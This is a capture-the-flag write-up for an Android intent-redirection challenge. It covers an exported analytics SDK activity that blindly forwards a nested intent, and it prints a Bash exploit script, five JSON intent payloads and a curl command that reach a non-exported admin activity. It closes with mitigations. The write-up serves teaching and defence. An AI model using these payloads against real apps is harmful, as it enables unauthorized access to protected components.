# Challenge - Phantom Thread 

- Category: Mobile  
- Difficulty: Medium  

Phantom Thread is a medium‑difficulty mobile security challenge that simulates an Android messaging application (`com.fluidctf.messenger`) exposed via a web API that drives the app’s internal component system. The goal is to reach a protected `AdminPanelActivity` — which is not exported and guarded by a custom admin permission — by abusing a vulnerable third‑party analytics SDK component that blindly forwards intents.

---

## 1. Challenge Overview

The backend exposes a small HTTP API that mirrors the Android app’s structure:

- `GET /api/info` — general application metadata.
- `GET /api/activities` — list of all declared activities and their flags (exported, permissions).
- `POST /api/intent/send` — sends a serialized Android intent into a simulator which resolves and dispatches it to the appropriate activity.

From `/api/info` and `/api/activities`, we can infer the important Android components:

- `com.fluidctf.messenger.MainActivity` — exported, entry point.
- `com.fluidctf.messenger.sdk.AnalyticsRedirectActivity` — exported, part of an analytics SDK.
- Several internal activities (`ChatActivity`, `SettingsActivity`, `ProfileActivity`, …) — not exported.
- `com.fluidctf.messenger.AdminPanelActivity` — not exported and protected by `com.fluidctf.messenger.permission.ADMIN`.

Directly launching `AdminPanelActivity` from outside is impossible due to `exported="false"` and the custom permission; we need to pivot through another activity that can start it from inside the app process.

---

## 2. Vulnerable Component: `AnalyticsRedirectActivity` and `next_intent`

The decompiled code for the SDK’s `AnalyticsRedirectActivity` reveals the core issue:

```java
public class AnalyticsRedirectActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent redirectIntent = getIntent().getParcelableExtra("next_intent");
        if (redirectIntent != null) {
            startActivity(redirectIntent);  // Blind redirect, no validation
        }
        finish();
    }
}
```

Key points:

- `AnalyticsRedirectActivity` is **exported** and requires no special permission, meaning any external caller (or our API proxy) can send it an intent.
- It looks for a `next_intent` extra in the incoming intent.
- If present, it calls `startActivity(next_intent)` without checking the target component, its exported flag, or required permissions.
- Because this call happens **inside** the app process, Android treats it as an intra‑app call; `exported=false` on the target activity does not prevent it from being launched.

This is a classic Android **Intent Redirection** vulnerability: an exported component that forwards arbitrary intents to internal components, effectively acting as a bridge from the outside world into private activities such as `AdminPanelActivity`.

---

## 3. Exploit Script

To exploit this behavior over the web API, I used the following Bash script:

```bash
#!/usr/bin/env bash
set -u

BASE="${1:-https://INSTANCE.chal.ctf.ae}"

FLAG_RE='(after|flag|ctf|ctfae)\{[^}]+\}'

echo "[+] Target: $BASE"
echo

echo "[+] Info:"
curl -sk "$BASE/api/info" | jq . 2>/dev/null || curl -sk "$BASE/api/info"
echo

echo "[+] Activities:"
curl -sk "$BASE/api/activities" | jq . 2>/dev/null || curl -sk "$BASE/api/activities"
echo

send_payload() {
  local name="$1"
  local payload="$2"

  echo
  echo "=============================="
  echo "[+] Testing payload: $name"
  echo "=============================="

  echo "$payload" | jq . 2>/dev/null || echo "$payload"
  echo

  resp="$(curl -sk -X POST "$BASE/api/intent/send" \
    -H 'Content-Type: application/json' \
    --data-binary "$payload")"

  echo "$resp" | jq . 2>/dev/null || echo "$resp"

  flag="$(echo "$resp" | grep -Eoi "$FLAG_RE" | head -n1 || true)"
  if [ -n "$flag" ]; then
    echo
    echo "[+] FLAG FOUND:"
    echo "$flag"
    exit 0
  fi
}

# Payload 1: full component string with extras.
send_payload "redirect_component_full" '{
  "component": "com.fluidctf.messenger/com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
    }
  }
}'

# Payload 2: short-class Android style (relative class names).
send_payload "redirect_component_short" '{
  "component": "com.fluidctf.messenger/.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "component": "com.fluidctf.messenger/.AdminPanelActivity"
    }
  }
}'

# Payload 3: explicit package + class fields.
send_payload "redirect_package_class" '{
  "package": "com.fluidctf.messenger",
  "class": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "package": "com.fluidctf.messenger",
      "class": "com.fluidctf.messenger.AdminPanelActivity"
    }
  }
}'

# Payload 4: typed extra representing an Intent object.
send_payload "redirect_typed_extra" '{
  "component": "com.fluidctf.messenger/com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "type": "intent",
      "value": {
        "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
      }
    }
  }
}'

# Payload 5: resolve by action only, letting the resolver find the exported SDK activity.
send_payload "redirect_by_action" '{
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
    }
  }
}'

echo
echo "[-] Flag did not appear automatically."
echo "[*] Root bug:"
echo "    exported AnalyticsRedirectActivity -> extra next_intent -> startActivity(next) -> AdminPanelActivity"

echo
echo "[*] Main manual test:"
cat <<'EOF'
curl -sk -X POST 'https://INSTANCE.chal.ctf.ae/api/intent/send' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "component": "com.fluidctf.messenger/com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
    "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
    "categories": ["android.intent.category.DEFAULT"],
    "extras": {
      "next_intent": {
        "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
      }
    }
  }' | jq
EOF
```

The helper `send_payload`:

- Prints the payload.
- Sends it to `POST /api/intent/send`.
- Pretty‑prints the response if `jq` is available.
- Searches the response for a flag‑shaped string with a flexible regex.

---

## 4. Payload Formats and Intent Resolution

The challenge’s backend accepts several JSON representations of an Android `Intent`. The script tries multiple styles to be robust against how the simulator parses them.

### 4.1 Full `component` field (standard ComponentName)

First payload uses the classic `package/class` format separated by `/`:

```json
{
  "component": "com.fluidctf.messenger/com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
    }
  }
}
```

On the server side this maps naturally to:

- `setComponent(new ComponentName("com.fluidctf.messenger", "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity"))` for the outer intent.
- A nested `Intent` in `extras.next_intent` pointing at `AdminPanelActivity`.

This is the main exploit payload; once dispatched, the simulator delivers it to `AnalyticsRedirectActivity`, which performs the blind redirect.

### 4.2 Short relative class names (`.sdk.AnalyticsRedirectActivity`)

```json
{
  "component": "com.fluidctf.messenger/.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "component": "com.fluidctf.messenger/.AdminPanelActivity"
    }
  }
}
```

This mirrors Android’s habit of treating classes starting with `.` as relative to the package. If the backend emulates that behavior, it resolves both outer and inner components correctly.

### 4.3 Explicit `package` and `class`

```json
{
  "package": "com.fluidctf.messenger",
  "class": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "package": "com.fluidctf.messenger",
      "class": "com.fluidctf.messenger.AdminPanelActivity"
    }
  }
}
```

Separating `package` and `class` is often clearer, and some serializers prefer this format. The idea is the same: outer intent → SDK redirect activity, nested intent → admin panel.

### 4.4 Typed `intent` extra

```json
{
  "component": "com.fluidctf.messenger/com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "type": "intent",
      "value": {
        "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
      }
    }
  }
}
```

Some frameworks encode complex extras like `Parcelable` `Intent` objects with a `type` + `value` wrapper. This payload caters for that possibility.

### 4.5 Resolution by action only

```json
{
  "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "categories": ["android.intent.category.DEFAULT"],
  "extras": {
    "next_intent": {
      "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
    }
  }
}
```

Here we omit a concrete component for the outer intent and let the system look up an exported activity that handles the `ANALYTICS_REDIRECT` action. As long as `AnalyticsRedirectActivity` is registered with that action, it will be chosen as the target.

---

## 5. End‑to‑End Attack Chain

The complete exploit flow is:

1. **Craft an outer intent** targeting `AnalyticsRedirectActivity` (by component or action).
2. **Embed an inner intent** in the `next_intent` extra that points directly to `AdminPanelActivity`.
3. **Send the JSON payload** to `POST /api/intent/send`.
4. The simulator delivers the outer intent to the exported SDK activity.
5. `AnalyticsRedirectActivity` extracts `next_intent` and calls `startActivity()` on it.
6. Android treats this call as intra‑app, ignoring the `exported=false` flag on `AdminPanelActivity`.
7. `AdminPanelActivity` launches, runs its privileged logic, and produces the flag, which is surfaced back through the simulator/API response.
8. The Bash script’s regex (`FLAG_RE`) detects the flag in the response and prints it.

At the bottom of the script there is also a “manual test” payload that can be used directly with `curl` for debugging. It’s essentially the minimal working exploit in one JSON:

```bash
curl -sk -X POST 'https://INSTANCE.chal.ctf.ae/api/intent/send' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "component": "com.fluidctf.messenger/com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
    "action": "com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
    "categories": ["android.intent.category.DEFAULT"],
    "extras": {
      "next_intent": {
        "component": "com.fluidctf.messenger/com.fluidctf.messenger.AdminPanelActivity"
      }
    }
  }' | jq
```

---

## 6. Security Lessons

This challenge illustrates several important Android security lessons:

- **Exported components are attack surface**: Every exported `Activity`, `Service`, or `BroadcastReceiver` should be audited, especially those provided by third‑party SDKs.
- **Never forward unvalidated intents**: `AnalyticsRedirectActivity` blindly forwards any `next_intent` it receives. A safe implementation would:
  - Validate that the target component belongs to the same package.
  - Restrict destinations to a well‑defined whitelist.
  - Reject nested intents originating from untrusted sources.
- **Intra‑app calls bypass `exported=false`**: Component export flags only protect against calls from *other* apps. Once a malicious payload reaches an exported bridge inside the app, that bridge can call private components freely.
- **Third‑party SDKs frequently introduce these bugs**: Developers often integrate analytics SDKs without fully vetting their intent‑handling code, leading to vulnerabilities like this one.
- **Mitigations**:
  - Mark redirect activities `exported="false"` unless genuinely needed externally.
  - Use signature‑level permissions on sensitive components.
  - Call `setPackage(getPackageName())` on forwarded intents to restrict them to the app’s own package.
  - Avoid exposing generic “redirect” endpoints that accept full arbitrary intents from untrusted sources.

Phantom Thread is a neat example of how a single misdesigned SDK activity (`AnalyticsRedirectActivity`) can completely undermine Android’s component isolation, letting an attacker pivot from a web‑driven intent interface to a non‑exported admin panel and retrieve the flag with a relatively simple payload and a small Bash script.
